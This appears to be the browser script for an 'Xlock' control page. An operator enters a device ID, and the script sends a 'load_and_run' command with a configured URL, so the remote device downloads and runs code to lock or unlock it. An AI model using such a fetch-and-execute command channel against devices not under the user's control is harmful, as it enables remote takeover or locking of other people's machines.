document.addEventListener('DOMContentLoaded', () => {
    console.log('Xlock page loaded.');

    const lockButton = document.getElementById('lock-button');
    const unlockButton = document.getElementById('unlock-button');
    const statusText = document.getElementById('status-text');
    const deviceForm = document.getElementById('device-form');
    const deviceInput = document.getElementById('device-id-input');
    const deviceSubmit = document.getElementById('device-submit');
    let currentCommand = null;

    deviceForm.style.display = 'none';

    async function sendCommand(device_id, url) {
        try {
            const response = await fetch('/api/commands', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    device_id, 
                    command: 'load_and_run',
                    url 
                }),
            });

            const result = await response.json();
            if (result.success) {
                alert(`Command sent successfully to device ${device_id}`);
                console.log(`Command sent: ${result.message}`);
                statusText.textContent = 
                    currentCommand === 'lock'
                        ? `Locked device ${device_id}`
                        : `Unlocked device ${device_id}`;
                statusText.style.color = currentCommand === 'lock' ? 'red' : 'green';
            } else {
                alert(`Error: ${result.error}`);
                console.error(result.error);
            }
        } catch (error) {
            console.error('Error sending command:', error);
            alert('Failed to send command.');
        }
    }

    async function getConfigUrl(commandType) {
        try {
            // { lock: "...", unlock: "..." }
            const response = await fetch('/config/xlock');
            const config = await response.json();
            return config[commandType];
        } catch (error) {
            console.error('Error fetching configuration:', error);
            alert('Failed to load configuration.');
            return null;
        }
    }

    function showForm(command) {
        currentCommand = command;
        deviceForm.style.display = 'block';
        deviceInput.value = '';
        deviceInput.focus();
    }

    function hideForm() {
        deviceForm.style.display = 'none';
        currentCommand = null;
    }

    lockButton.addEventListener('click', (event) => {
        event.stopPropagation(); 
        showForm('lock');
    });

    unlockButton.addEventListener('click', (event) => {
        event.stopPropagation(); 
        showForm('unlock');
    });

    deviceSubmit.addEventListener('click', async () => {
        const device_id = deviceInput.value.trim();
        if (!device_id) {
            alert('Device ID is required.');
            return;
        }

        const url = await getConfigUrl(currentCommand);
        if (url) {
            await sendCommand(device_id, url);
            hideForm();
        }
    });

    document.addEventListener('click', (event) => {
        const isClickInsideForm = deviceForm.contains(event.target);
        const isClickOnButton = 
            event.target === lockButton || event.target === unlockButton;

        if (!isClickInsideForm && !isClickOnButton) {
            hideForm();
        }
    });
});



